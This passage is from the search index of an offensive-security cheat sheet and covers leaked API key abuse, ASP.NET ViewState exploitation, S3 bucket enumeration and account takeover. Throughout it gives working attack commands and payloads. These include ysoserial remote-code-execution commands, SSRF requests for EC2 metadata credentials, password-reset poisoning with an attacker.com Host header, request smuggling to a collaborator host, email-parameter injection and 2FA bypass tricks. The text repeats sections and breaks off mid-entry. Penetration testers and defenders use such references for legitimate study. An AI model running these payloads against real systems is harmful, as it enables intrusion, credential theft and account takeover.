https://maps.googleapis.com/maps/api/timezone/json?location=39.6034810,-119.6822510&timestamp=1331161200&key=KEY_HERE | | Roads | https://roads.googleapis.com/v1/nearestRoads?points=60.170880,24.942795|60.170879,24.942796|60.170877,24.942796&key=KEY_HERE | | Geolocate | https://www.googleapis.com/geolocation/v1/geolocate?key=KEY_HERE | Impact: * Consuming the company's monthly quota or can over-bill with unauthorized usage of this service and do financial damage to the company * Conduct a denial of service attack specific to the service if any limitation of maximum bill control settings exist in the Google account","title":"Google Maps"},{"location":"API%20Key%20Leaks/#algolia","text":"curl --request PUT \\ --url https://<application-id>-1.algolianet.com/1/indexes/<example-index>/settings \\ --header 'content-type: application/json' \\ --header 'x-algolia-api-key: <example-key>' \\ --header 'x-algolia-application-id: <example-application-id>' \\ --data '{\"highlightPreTag\": \"<script>alert(1);</script>\"}'","title":"Algolia"},{"location":"API%20Key%20Leaks/#slack-api-token","text":"curl -sX POST \"https://slack.com/api/auth.test?token=xoxp-TOKEN_HERE&pretty=1\"","title":"Slack API Token"},{"location":"API%20Key%20Leaks/#facebook-access-token","text":"curl https://developers.facebook.com/tools/debug/accesstoken/?access_token=ACCESS_TOKEN_HERE&version=v3.2","title":"Facebook Access Token"},{"location":"API%20Key%20Leaks/#github-client-id-and-client-secret","text":"curl 'https://api.github.com/users/whatever?client_id=xxxx&client_secret=yyyy'","title":"Github client id and client secret"},{"location":"API%20Key%20Leaks/#twilio-account_sid-and-auth-token","text":"curl -X GET 'https://api.twilio.com/2010-04-01/Accounts.json' -u ACCOUNT_SID:AUTH_TOKEN","title":"Twilio Account_sid and Auth token"},{"location":"API%20Key%20Leaks/#twitter-api-secret","text":"curl -u 'API key:API secret key' --data 'grant_type=client_credentials' 'https://api.twitter.com/oauth2/token'","title":"Twitter API Secret"},{"location":"API%20Key%20Leaks/#twitter-bearer-token","text":"curl --request GET --url https://api.twitter.com/1.1/account_activity/all/subscriptions/count.json --header 'authorization: Bearer TOKEN'","title":"Twitter Bearer Token"},{"location":"API%20Key%20Leaks/#gitlab-personal-access-token","text":"curl \"https://gitlab.example.com/api/v4/projects?private_token=<your_access_token>\"","title":"Gitlab Personal Access Token"},{"location":"API%20Key%20Leaks/#hockeyapp-api-token","text":"curl -H \"X-HockeyAppToken: ad136912c642076b0d1f32ba161f1846b2c\" https://rink.hockeyapp.net/api/2/apps/2021bdf2671ab09174c1de5ad147ea2ba4","title":"HockeyApp API Token"},{"location":"API%20Key%20Leaks/#iis-machine-keys","text":"That machine key is used for encryption and decryption of forms authentication cookie data and view-state data, and for verification of out-of-process session state identification. Requirements * machineKey validationKey and decryptionKey * __VIEWSTATEGENERATOR cookies * __VIEWSTATE cookies Example of a machineKey from https://docs.microsoft.com/en-us/iis/troubleshoot/security-issues/troubleshooting-forms-authentication. <machineKey validationKey=\"87AC8F432C8DB844A4EFD024301AC1AB5808BEE9D1870689B63794D33EE3B55CDB315BB480721A107187561F388C6BEF5B623BF31E2E725FC3F3F71A32BA5DFC\" decryptionKey=\"E001A307CCC8B1ADEA2C55B1246CDCFE8579576997FF92E7\" validation=\"SHA1\" /> Common locations of web.config / machine.config * 32-bit * C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\config\\machine.config * C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\config\\machine.config * 64-bit * C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\config\\machine.config * C:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727\\config\\machine.config * in registry when AutoGenerate is enabled (extract with https://gist.github.com/irsdl/36e78f62b98f879ba36f72ce4fda73ab) * HKEY_CURRENT_USER\\Software\\Microsoft\\ASP.NET\\4.0.30319.0\\AutoGenKeyV4 * HKEY_CURRENT_USER\\Software\\Microsoft\\ASP.NET\\2.0.50727.0\\AutoGenKey","title":"IIS Machine Keys"},{"location":"API%20Key%20Leaks/#identify-known-machine-key","text":"Exploit with Blacklist3r/AspDotNetWrapper Exploit with ViewGen # --webconfig WEBCONFIG: automatically load keys and algorithms from a web.config file # -m MODIFIER, --modifier MODIFIER: VIEWSTATEGENERATOR value $ viewgen --guess \"/wEPDwUKMTYyODkyNTEzMw9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRkuVmqYhhtcnJl6Nfet5ERqNHMADI=\" [+] ViewState is not encrypted [+] Signature algorithm: SHA1 # --encrypteddata : __VIEWSTATE parameter value of the target application # --modifier : __VIEWSTATEGENERATOR parameter value $ AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata <real viewstate value> --purpose=viewstate --modifier=<modifier value> \u2013macdecode","title":"Identify known machine key"},{"location":"API%20Key%20Leaks/#decode-viewstate","text":"$ viewgen --decode --check --webconfig web.config --modifier CA0B0334 \"zUylqfbpWnWHwPqet3cH5Prypl94LtUPcoC7ujm9JJdLm8V7Ng4tlnGPEWUXly+CDxBWmtOit2HY314LI8ypNOJuaLdRfxUK7mGsgLDvZsMg/MXN31lcDsiAnPTYUYYcdEH27rT6taXzDWupmQjAjraDueY=\" $ .\\AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata /wEPDwUKLTkyMTY0MDUxMg9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRkbdrqZ4p5EfFa9GPqKfSQRGANwLs= --decrypt --purpose=viewstate --modifier=CA0B0334 --macdecode $ .\\AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata /wEPDwUKLTkyMTY0MDUxMg9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRkbdrqZ4p5EfFa9GPqKfSQRGANwLs= --decrypt --purpose=viewstate --modifier=6811C9FF --macdecode --TargetPagePath \"/Savings-and-Investments/Application/ContactDetails.aspx\" -f out.txt --IISDirPath=\"/\"","title":"Decode ViewState"},{"location":"API%20Key%20Leaks/#generate-viewstate-for-rce","text":"NOTE : Send a POST request with the generated ViewState to the same endpoint, in Burp you should URL Encode Key Characters for your payload. $ ysoserial.exe -p ViewState -g TextFormattingRunProperties -c \"cmd.exe /c nslookup <your collab domain>\" --decryptionalg=\"AES\" --generator=ABABABAB decryptionkey=\"<decryption key>\" --validationalg=\"SHA1\" --validationkey=\"<validation key>\" $ ysoserial.exe -p ViewState -g TypeConfuseDelegate -c \"echo 123 > c:\\pwn.txt\" --generator=\"CA0B0334\" --validationalg=\"MD5\" --validationkey=\"b07b0f97365416288cf0247cffdf135d25f6be87\" $ ysoserial.exe -p ViewState -g ActivitySurrogateSelectorFromFile -c \"C:\\Users\\zhu\\Desktop\\ExploitClass.cs;C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\System.dll;C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\System.Web.dll\" --generator=\"CA0B0334\" --validationalg=\"SHA1\" --validationkey=\"b07b0f97365416288cf0247cffdf135d25f6be87\" $ viewgen --webconfig web.config -m CA0B0334 -c \"ping yourdomain.tld\"","title":"Generate ViewState for RCE"},{"location":"API%20Key%20Leaks/#edit-cookies-with-the-machine-key","text":"If you have the machineKey but the viewstate is disabled. ASP.net Forms Authentication Cookies : https://github.com/liquidsec/aspnetCryptTools # decrypt cookie $ AspDotNetWrapper.exe --keypath C:\\MachineKey.txt --cookie XXXXXXX_XXXXX-XXXXX --decrypt --purpose=owin.cookie --valalgo=hmacsha512 --decalgo=aes # encrypt cookie (edit Decrypted.txt) $ AspDotNetWrapper.exe --decryptDataFilePath C:\\DecryptedText.txt","title":"Edit cookies with the machine key"},{"location":"API%20Key%20Leaks/#mapbox-api-token","text":"A Mapbox API Token is a JSON Web Token (JWT). If the header of the JWT is sk , jackpot. If it's pk or tk , it's not worth your time. #Check token validity curl \"https://api.mapbox.com/tokens/v2?access_token=YOUR_MAPBOX_ACCESS_TOKEN\" #Get list of all tokens associated with an account. (only works if the token is a Secret Token (sk), and has the appropiate scope) curl \"https://api.mapbox.com/tokens/v2/MAPBOX_USERNAME_HERE?access_token=YOUR_MAPBOX_ACCESS_TOKEN\"","title":"Mapbox API Token"},{"location":"API%20Key%20Leaks/#references","text":"Finding Hidden API Keys & How to use them - Sumit Jain - August 24, 2019 Private API key leakage due to lack of access control - yox - August 8, 2018 Project Blacklist3r - November 23, 2018 - @notsosecure Saying Goodbye to my Favorite 5 Minute P1 - Allyson O'Malley - January 6, 2020 Mapbox API Token Documentation","title":"References"},{"location":"AWS%20Amazon%20Bucket%20S3/","text":"Amazon Bucket S3 AWS Summary AWS Configuration Open Bucket Basic tests Listing files Move a file into the bucket Download every things Check bucket disk size AWS - Extract Backup Bucket juicy data AWS Configuration Prerequisites, at least you need awscli sudo apt install awscli You can get your credential here https://console.aws.amazon.com/iam/home?#/security_credential but you need an aws account, free tier account : https://aws.amazon.com/s/dm/optimization/server-side-test/free-tier/free_np/ aws configure AWSAccessKeyId=[ENTER HERE YOUR KEY] AWSSecretKey=[ENTER HERE YOUR KEY] aws configure --profile nameofprofile then you can use --profile nameofprofile in the aws command. Alternatively you can use environment variables instead of creating a profile. export AWS_ACCESS_KEY_ID=ASIAZ[...]PODP56 export AWS_SECRET_ACCESS_KEY=fPk/Gya[...]4/j5bSuhDQ export AWS_SESSION_TOKEN=FQoGZXIvYXdzE[...]8aOK4QU= Open Bucket By default the name of Amazon Bucket are like http://s3.amazonaws.com/[bucket_name]/, you can browse open buckets if you know their names http://s3.amazonaws.com/[bucket_name]/ http://[bucket_name].s3.amazonaws.com/ http://flaws.cloud.s3.amazonaws.com/ https://buckets.grayhatwarfare.com/ Their names are also listed if the listing is enabled. <ListBucketResult xmlns=\"http://s3.amazonaws.com/doc/2006-03-01/\"> <Name>adobe-REDACTED-REDACTED-REDACTED</Name> Alternatively you can extract the name of inside-site s3 bucket with %C0 . (Trick from https://twitter.com/0xmdv/status/1065581916437585920) http://example.com/resources/id%C0 eg: http://redacted/avatar/123%C0 Basic tests Listing files aws s3 ls s3://targetbucket --no-sign-request --region insert-region-here aws s3 ls s3://flaws.cloud/ --no-sign-request --region us-west-2 You can get the region with a dig and nslookup $ dig flaws.cloud ;; ANSWER SECTION: flaws.cloud. 5 IN A 52.218.192.11 $ nslookup 52.218.192.11 Non-authoritative answer: 11.192.218.52.in-addr.arpa name = s3-website-us-west-2.amazonaws.com. Move a file into the bucket aws s3 cp local.txt s3://some-bucket/remote.txt --acl authenticated-read aws s3 cp login.html s3://$bucketName --grants read=uri=http://acs.amazonaws.com/groups/global/AllUsers aws s3 mv test.txt s3://hackerone.marketing FAIL : \"move failed: ./test.txt to s3://hackerone.marketing/test.txt A client error (AccessDenied) occurred when calling the PutObject operation: Access Denied.\" aws s3 mv test.txt s3://hackerone.files SUCCESS : \"move: ./test.txt to s3://hackerone.files/test.txt\" Download every things aws s3 sync s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/ . --no-sign-request --region us-west-2 Check bucket disk size Use --no-sign for un-authenticated check. aws s3 ls s3://<bucketname> --recursive | grep -v -E \"(Bucket: |Prefix: |LastWriteTime|^$|--)\" | awk 'BEGIN {total=0}{total+=$3}END{print total/1024/1024\" MB\"}' AWS - Extract Backup $ aws --profile flaws sts get-caller-identity \"Account\": \"XXXX26262029\", $ aws --profile profile_name ec2 describe-snapshots $ aws --profile flaws ec2 describe-snapshots --owner-id XXXX26262029 --region us-west-2 \"SnapshotId\": \"snap-XXXX342abd1bdcb89\", Create a volume using snapshot $ aws --profile swk ec2 create-volume --availability-zone us-west-2a --region us-west-2 --snapshot-id snap-XXXX342abd1bdcb89 In Aws Console -> EC2 -> New Ubuntu $ chmod 400 YOUR_KEY.pem $ ssh -i YOUR_KEY.pem ubuntu@ec2-XXX-XXX-XXX-XXX.us-east-2.compute.amazonaws.com Mount the volume $ lsblk $ sudo file -s /dev/xvda1 $ sudo mount /dev/xvda1 /mnt Bucket juicy data Amazon exposes an internal service every EC2 instance can query for instance metadata about the host. If you found an SSRF vulnerability that runs on EC2, try requesting : http://169.254.169.254/latest/meta-data/ http://169.254.169.254/latest/user-data/ http://169.254.169.254/latest/meta-data/iam/security-credentials/IAM_USER_ROLE_HERE will return the AccessKeyID, SecretAccessKey, and Token http://169.254.169.254/latest/meta-data/iam/security-credentials/PhotonInstance For example with a proxy : http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws/ References There's a Hole in 1,951 Amazon S3 Buckets - Mar 27, 2013 - Rapid7 willis Bug Bounty Survey - AWS Basic test flaws.cloud Challenge based on AWS vulnerabilities - by Scott Piper of Summit Route flaws2.cloud Challenge based on AWS vulnerabilities - by Scott Piper of Summit Route Guardzilla video camera hardcoded AWS credential - 0dayallday.org AWS PENETRATION TESTING PART 1. S3 BUCKETS - VirtueSecurity AWS PENETRATION TESTING PART 2. S3, IAM, EC2 - VirtueSecurity A Technical Analysis of the Capital One Hack - CloudSploit - Aug 2 2019","title":"Amazon Bucket S3 AWS"},{"location":"AWS%20Amazon%20Bucket%20S3/#amazon-bucket-s3-aws","text":"","title":"Amazon Bucket S3 AWS"},{"location":"AWS%20Amazon%20Bucket%20S3/#summary","text":"AWS Configuration Open Bucket Basic tests Listing files Move a file into the bucket Download every things Check bucket disk size AWS - Extract Backup Bucket juicy data","title":"Summary"},{"location":"AWS%20Amazon%20Bucket%20S3/#aws-configuration","text":"Prerequisites, at least you need awscli sudo apt install awscli You can get your credential here https://console.aws.amazon.com/iam/home?#/security_credential but you need an aws account, free tier account : https://aws.amazon.com/s/dm/optimization/server-side-test/free-tier/free_np/ aws configure AWSAccessKeyId=[ENTER HERE YOUR KEY] AWSSecretKey=[ENTER HERE YOUR KEY] aws configure --profile nameofprofile then you can use --profile nameofprofile in the aws command. Alternatively you can use environment variables instead of creating a profile. export AWS_ACCESS_KEY_ID=ASIAZ[...]PODP56 export AWS_SECRET_ACCESS_KEY=fPk/Gya[...]4/j5bSuhDQ export AWS_SESSION_TOKEN=FQoGZXIvYXdzE[...]8aOK4QU=","title":"AWS Configuration"},{"location":"AWS%20Amazon%20Bucket%20S3/#open-bucket","text":"By default the name of Amazon Bucket are like http://s3.amazonaws.com/[bucket_name]/, you can browse open buckets if you know their names http://s3.amazonaws.com/[bucket_name]/ http://[bucket_name].s3.amazonaws.com/ http://flaws.cloud.s3.amazonaws.com/ https://buckets.grayhatwarfare.com/ Their names are also listed if the listing is enabled. <ListBucketResult xmlns=\"http://s3.amazonaws.com/doc/2006-03-01/\"> <Name>adobe-REDACTED-REDACTED-REDACTED</Name> Alternatively you can extract the name of inside-site s3 bucket with %C0 . (Trick from https://twitter.com/0xmdv/status/1065581916437585920) http://example.com/resources/id%C0 eg: http://redacted/avatar/123%C0","title":"Open Bucket"},{"location":"AWS%20Amazon%20Bucket%20S3/#basic-tests","text":"","title":"Basic tests"},{"location":"AWS%20Amazon%20Bucket%20S3/#listing-files","text":"aws s3 ls s3://targetbucket --no-sign-request --region insert-region-here aws s3 ls s3://flaws.cloud/ --no-sign-request --region us-west-2 You can get the region with a dig and nslookup $ dig flaws.cloud ;; ANSWER SECTION: flaws.cloud. 5 IN A 52.218.192.11 $ nslookup 52.218.192.11 Non-authoritative answer: 11.192.218.52.in-addr.arpa name = s3-website-us-west-2.amazonaws.com.","title":"Listing files"},{"location":"AWS%20Amazon%20Bucket%20S3/#move-a-file-into-the-bucket","text":"aws s3 cp local.txt s3://some-bucket/remote.txt --acl authenticated-read aws s3 cp login.html s3://$bucketName --grants read=uri=http://acs.amazonaws.com/groups/global/AllUsers aws s3 mv test.txt s3://hackerone.marketing FAIL : \"move failed: ./test.txt to s3://hackerone.marketing/test.txt A client error (AccessDenied) occurred when calling the PutObject operation: Access Denied.\" aws s3 mv test.txt s3://hackerone.files SUCCESS : \"move: ./test.txt to s3://hackerone.files/test.txt\"","title":"Move a file into the bucket"},{"location":"AWS%20Amazon%20Bucket%20S3/#download-every-things","text":"aws s3 sync s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/ . --no-sign-request --region us-west-2","title":"Download every things"},{"location":"AWS%20Amazon%20Bucket%20S3/#check-bucket-disk-size","text":"Use --no-sign for un-authenticated check. aws s3 ls s3://<bucketname> --recursive | grep -v -E \"(Bucket: |Prefix: |LastWriteTime|^$|--)\" | awk 'BEGIN {total=0}{total+=$3}END{print total/1024/1024\" MB\"}'","title":"Check bucket disk size"},{"location":"AWS%20Amazon%20Bucket%20S3/#aws-extract-backup","text":"$ aws --profile flaws sts get-caller-identity \"Account\": \"XXXX26262029\", $ aws --profile profile_name ec2 describe-snapshots $ aws --profile flaws ec2 describe-snapshots --owner-id XXXX26262029 --region us-west-2 \"SnapshotId\": \"snap-XXXX342abd1bdcb89\", Create a volume using snapshot $ aws --profile swk ec2 create-volume --availability-zone us-west-2a --region us-west-2 --snapshot-id snap-XXXX342abd1bdcb89 In Aws Console -> EC2 -> New Ubuntu $ chmod 400 YOUR_KEY.pem $ ssh -i YOUR_KEY.pem ubuntu@ec2-XXX-XXX-XXX-XXX.us-east-2.compute.amazonaws.com Mount the volume $ lsblk $ sudo file -s /dev/xvda1 $ sudo mount /dev/xvda1 /mnt","title":"AWS - Extract Backup"},{"location":"AWS%20Amazon%20Bucket%20S3/#bucket-juicy-data","text":"Amazon exposes an internal service every EC2 instance can query for instance metadata about the host. If you found an SSRF vulnerability that runs on EC2, try requesting : http://169.254.169.254/latest/meta-data/ http://169.254.169.254/latest/user-data/ http://169.254.169.254/latest/meta-data/iam/security-credentials/IAM_USER_ROLE_HERE will return the AccessKeyID, SecretAccessKey, and Token http://169.254.169.254/latest/meta-data/iam/security-credentials/PhotonInstance For example with a proxy : http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws/","title":"Bucket juicy data"},{"location":"AWS%20Amazon%20Bucket%20S3/#references","text":"There's a Hole in 1,951 Amazon S3 Buckets - Mar 27, 2013 - Rapid7 willis Bug Bounty Survey - AWS Basic test flaws.cloud Challenge based on AWS vulnerabilities - by Scott Piper of Summit Route flaws2.cloud Challenge based on AWS vulnerabilities - by Scott Piper of Summit Route Guardzilla video camera hardcoded AWS credential - 0dayallday.org AWS PENETRATION TESTING PART 1. S3 BUCKETS - VirtueSecurity AWS PENETRATION TESTING PART 2. S3, IAM, EC2 - VirtueSecurity A Technical Analysis of the Capital One Hack - CloudSploit - Aug 2 2019","title":"References"},{"location":"Account%20Takeover/","text":"Account Takeover Summary Password Reset Feature Password Reset Token Leak Via Referrer Account Takeover Through Password Reset Poisoning Password Reset Via Email Parameter IDOR on API Parameters Weak Password Reset Token Leaking Password Reset Token Password Reset Via Username Collision Account takeover due to unicode normalization issue Account Takeover Via Cross Site Scripting Account Takeover Via HTTP Request Smuggling Account Takeover via CSRF 2FA Bypasses Response Manipulation Status Code Manipulation 2FA Code Leakage in Response JS File Analysis 2FA Code Reusability Lack of Brute-Force Protection Missing 2FA Code Integrity Validation CSRF on 2FA Disabling Password Reset Disable 2FA Backup Code Abuse Clickjacking on 2FA Disabling Page Enabling 2FA doesn't expire Previously active Sessions Bypass 2FA with null or 000000 Bypass 2FA with array References Password Reset Feature Password Reset Token Leak Via Referrer Request password reset to your email address Click on the password reset link Don't change password Click any 3rd party websites(eg: Facebook, twitter) Intercept the request in Burp Suite proxy Check if the referer header is leaking password reset token. Account Takeover Through Password Reset Poisoning Intercept the password reset request in Burp Suite Add or edit the following headers in Burp Suite : Host: attacker.com , X-Forwarded-Host: attacker.com Forward the request with the modified header http POST https://example.com/reset.php HTTP/1.1 Accept: */* Content-Type: application/json Host: attacker.com Look for a password reset URL based on the host header like : https://attacker.com/reset-password.php?token=TOKEN Password Reset Via Email Parameter # parameter pollution email=victim@mail.com&email=hacker@mail.com # array of emails {\"email\":[\"victim@mail.com\",\"hacker@mail.com\"]} # carbon copy email=victim@mail.com%0A%0Dcc:hacker@mail.com email=victim@mail.com%0A%0Dbcc:hacker@mail.com # separator email=victim@mail.com,hacker@mail.com email=victim@mail.com%20hacker@mail.com email=victim@mail.com|hacker@mail.com IDOR on API Parameters Attacker have to login with their account and go to the Change password feature. Start the Burp Suite and Intercept the request Send it to the repeater tab and edit the parameters : User ID/email powershell POST /api/changepass [...] (\"form\": {\"email\":\"victim@email.com\",\"password\":\"securepwd\"}) Weak Password Reset Token The password reset token should be randomly generated and unique every time. Try to determine if the token expire or if it's always the same, in some cases the generation algorithm is weak and can be guessed. The following variables might be used by the algorithm. Timestamp UserID Email of User Firstname and Lastname Date of Birth Cryptography Number only Small token sequence (<6 characters between [A-Z,a-z,0-9]) Token reuse Token expiration date Leaking Password Reset Token Trigger a password reset request using the API/UI for a specific email e.g: test@mail.com Inspect the server response and check for resetToken Then use the token in an URL like https://example.com/v3/user/password/reset?resetToken=[THE_RESET_TOKEN]&email=[THE_MAIL] Password Reset Via Username Collision Register on the system with a username identical to the victim's username, but with white spaces inserted before and/or after the username. e.g: \"admin \" Request a password reset with your malicious username. Use the token sent to your email and reset the victim password. Connect to the victim account with the new password. The platform CTFd was vulnerable to this attack. See: CVE-2020-7245 Account takeover due to unicode normalization issue Victim account: demo@gmail.com Attacker account: dem\u24de@gmail.com Account Takeover Via Cross Site Scripting Find an XSS inside the application or a subdomain if the cookies are scoped to the parent domain : *.domain.com Leak the current sessions cookie Authenticate as the user using the cookie Account Takeover Via HTTP Request Smuggling Refer to HTTP Request Smuggling vulnerability page. 1. Use smuggler to detect the type of HTTP Request Smuggling (CL, TE, CL.TE) powershell git clone https://github.com/defparam/smuggler.git cd smuggler python3 smuggler.py -h 2. Craft a request which will overwrite the POST / HTTP/1.1 with the following data: powershell GET http://something.burpcollaborator.net HTTP/1.1 X: 3. Final request could look like the following ```powershell GET / HTTP/1.1 Transfer-Encoding: chunked Host: something.com User-Agent: Smuggler/v1.0 Content-Length: 83 0 GET http://something.burpcollaborator.net HTTP/1.1 X: X ``` Hackerone reports exploiting this bug * https://hackerone.com/reports/737140 * https://hackerone.com/reports/771666 Account Takeover via CSRF Create a payload for the CSRF, e.g: \"HTML form with auto submit for a password change\" Send the payload Account Takeover via JWT JSON Web Token might be used to authenticate an user. Edit the JWT with another User ID / Email Check for weak JWT signature 2FA Bypasses Response Manipulation In response if \"success\":false Change it to \"success\":true Status Code Manipulation If Status Code is 4xx Try to change it to 200 OK and see if it bypass restrictions 2FA Code Leakage in Response Check the response of the 2FA Code Triggering Request to see if the code is leaked. JS File Analysis Rare but some JS Files may contain info about the 2FA Code, worth giving a shot 2FA Code Reusability Same code can be reused Lack of Brute-Force Protection Possible to brute-force any length 2FA Code Missing 2FA Code Integrity Validation Code for any user acc can be used to bypass the 2FA CSRF on 2FA Disabling No CSRF Protection on disabling 2FA, also there is no auth confirmation Password Reset Disable 2FA 2FA gets disabled on password change/email change Backup Code Abuse Bypassing 2FA by abusing the Backup code feature Use the above mentioned techniques to bypass Backup Code to remove/reset 2FA restrictions Clickjacking on 2FA Disabling Page Iframing the 2FA Disabling page and social engineering victim to disable the 2FA Enabling 2FA doesn't expire Previously active Sessions If the session is already hijacked and there is a session timeout vuln Bypass 2FA with null or 000000 Enter the code 000000 or null to bypass 2FA protection. Bypass 2FA with array { \"otp\":[ \"1234\", \"1111\", \"1337\", // GOOD OTP \"2222\", \"3333\", \"4444\", \"5555\" ] } TODO Broken cryptography Session hijacking OAuth misconfiguration References 10 Password Reset Flaws - Anugrah SR $6,5k + $5k HTTP Request Smuggling mass account takeover - Slack + Zomato - Bug Bounty Reports Explained Broken Cryptography & Account Takeovers - Harsh Bothra - September 20, 2020 Hacking Grindr Accounts with Copy and Paste - Troy HUNT & Wassime BOUIMADAGHENE - 03 OCTOBER 2020 CTFd Account Takeover","title":"Account Takeover"},{"location":"Account%20Takeover/#account-takeover","text":"","title":"Account Takeover"},{"location":"Account%20Takeover/#summary","text":"Password Reset Feature Password Reset Token Leak Via Referrer Account Takeover Through Password Reset Poisoning Password Reset Via Email Parameter IDOR on API Parameters Weak Password Reset Token Leaking Password Reset Token Password Reset Via Username Collision Account takeover due to unicode normalization issue Account Takeover Via Cross Site Scripting Account Takeover Via HTTP Request Smuggling Account Takeover via CSRF 2FA Bypasses Response Manipulation Status Code Manipulation 2FA Code Leakage in Response JS File Analysis 2FA Code Reusability Lack of Brute-Force Protection Missing 2FA Code Integrity Validation CSRF on 2FA Disabling Password Reset Disable 2FA Backup Code Abuse Clickjacking on 2FA Disabling Page Enabling 2FA doesn't expire Previously active Sessions Bypass 2FA with null or 000000 Bypass 2FA with array References","title":"Summary"},{"location":"Account%20Takeover/#password-reset-feature","text":"","title":"Password Reset Feature"},{"location":"Account%20Takeover/#password-reset-token-leak-via-referrer","text":"Request password reset to your email address Click on the password reset link Don't change password Click any 3rd party websites(eg: Facebook, twitter) Intercept the request in Burp Suite proxy Check if the referer header is leaking password reset token.","title":"Password Reset Token Leak Via Referrer"},{"location":"Account%20Takeover/#account-takeover-through-password-reset-poisoning","text":"Intercept the password reset request in Burp Suite Add or edit the following headers in Burp Suite : Host: attacker.com , X-Forwarded-Host: attacker.com Forward the request with the modified header http POST https://example.com/reset.php HTTP/1.1 Accept: */* Content-Type: application/json Host: attacker.com Look for a password reset URL based on the host header like : https://attacker.com/reset-password.php?token=TOKEN","title":"Account Takeover Through Password Reset Poisoning"},{"location":"Account%20Takeover/#password-reset-via-email-parameter","text":"# parameter pollution email=victim@mail.com&email=hacker@mail.com # array of emails {\"email\":[\"victim@mail.com\",\"hacker@mail.com\"]} # carbon copy email=victim@mail.com%0A%0Dcc:hacker@mail.com email=victim@mail.com%0A%0Dbcc:hacker@mail.com # separator email=victim@mail.com,hacker@mail.com email=victim@mail.com%20hacker@mail.com email=victim@mail.com|hacker@mail.com","title":"Password Reset Via Email Parameter"},{"location":"Account%20Takeover/#idor-on-api-parameters","text":"Attacker have to login with their account and go to the Change password feature. Start the Burp Suite and Intercept the request Send it to the repeater tab and edit the parameters : User ID/email powershell POST /api/changepass [...] (\"form\": {\"email\":\"victim@email.com\",\"password\":\"securepwd\"})","title":"IDOR on API Parameters"},{"location":"Account%20Takeover/#weak-password-reset-token","text":"The password reset token should be randomly generated and unique every time. Try to determine if the token expire or if it's always the same, in some cases the generation algorithm is weak and can be guessed. The following variables might be used by the algorithm. Timestamp UserID Email of User Firstname and Lastname Date of Birth Cryptography Number only Small token sequence (<6 characters between [A-Z,a-z,0-9]) Token reuse Token expiration date","title":"Weak Password Reset Token"},{"location":"Account%20Takeover/#leaking-password-reset-token","text":"Trigger a password reset request using the API/UI for a specific email e.g: test@mail.com Inspect the server response and check for resetToken Then use the token in an URL like https://example.com/v3/user/password/reset?resetToken=[THE_RESET_TOKEN]&email=[THE_MAIL]","title":"Leaking Password Reset Token"},{"location":"Account%20Takeover/#password-reset-via-username-collision","text":"Register on the system with a username identical to the victim's username, but with white spaces inserted before and/or after the username. e.g: \"admin \" Request a password reset with your malicious username. Use the token sent to your email and reset the victim password. Connect to the victim account with the new password. The platform CTFd was vulnerable to this attack. See: CVE-2020-7245","title":"Password Reset Via Username Collision"},{"location":"Account%20Takeover/#account-takeover-due-to-unicode-normalization-issue","text":"Victim account: demo@gmail.com Attacker account: dem\u24de@gmail.com","title":"Account takeover due to unicode normalization issue"},{"location":"Account%20Takeover/#account-takeover-via-cross-site-scripting","text":"Find an XSS inside the application or a subdomain if the cookies are scoped to the parent domain : *.domain.com Leak the current sessions cookie Authenticate as the user using the cookie","title":"Account Takeover Via Cross Site Scripting"},{"location":"Account%20Takeover/#account-takeover-via-http-request-smuggling","text":"Refer to HTTP Request Smuggling vulnerability page. 1. Use smuggler to detect the type of HTTP Request Smuggling (CL, TE, CL.TE) powershell git clone https://github.com/defparam/smuggler.git cd smuggler python3 smuggler.py -h 2. Craft a request which will overwrite the POST / HTTP/1.1 with the following data: powershell GET http://something.burpcollaborator.net HTTP/1.1 X: 3. Final request could look like the following ```powershell GET / HTTP/1.1 Transfer-Encoding: chunked Host: something.com User-Agent: Smuggler/v1.0 Content-Length: 83 0 GET http://something.burpcollaborator.net HTTP/1.1 X: X ``` Hackerone reports exploiting this bug * https://hackerone.com/reports/737140 * https://hackerone.com/reports/771666","title":"Account Takeover Via HTTP Request Smuggling"},{"location":"Account%20Takeover/#account-takeover-via-csrf","text":"Create a payload for the CSRF, e.g: \"HTML form with auto submit for a password change\" Send the payload","title":"Account Takeover via CSRF"},{"location":"Account%20Takeover/#account-takeover-via-jwt","text":"JSON Web Token might be used to authenticate an user. Edit the JWT with another User ID / Email Check for weak JWT signature","title":"Account Takeover via JWT"},{"location":"Account%20Takeover/#2fa-bypasses","text":"","title":"2FA Bypasses"},{"location":"Account%20Takeover/#response-manipulation","text":"In response if \"success\":false Change it to \"success\":true","title":"Response Manipulation"},{"location":"Account%20Takeover/#status-code-manipulation","text":"If Status Code is 4xx Try to change it to 200 OK and see if it bypass restrictions","title":"Status Code Manipulation"},{"location":"Account%20Takeover/#2fa-code-leakage-in-response","text":"Check the response of the 2FA Code Triggering Request to see if the code is leaked.","title":"2FA Code Leakage in Response"},{"location":"Account%20Takeover/#js-file-analysis","text":"Rare but some JS Files may contain info about the 2FA Code, worth giving a shot","title":"JS File Analysis"},{"location":"Account%20Takeover/#2fa-code-reusability","text":"Same code can be reused","title":"2FA Code Reusability"},{"location":"Account%20Takeover/#lack-of-brute-force-protection","text":"Possible to brute-force any length 2FA Code","title":"Lack of Brute-Force Protection"},{"location":"Account%20Takeover/#missing-2fa-code-integrity-validation","text":"Code for any user acc can be used to bypass the 2FA","title":"Missing 2FA Code Integrity Validation"},{"location":"Account%20Takeover/#csrf-on-2fa-disabling","text":"No CSRF Protection on disabling 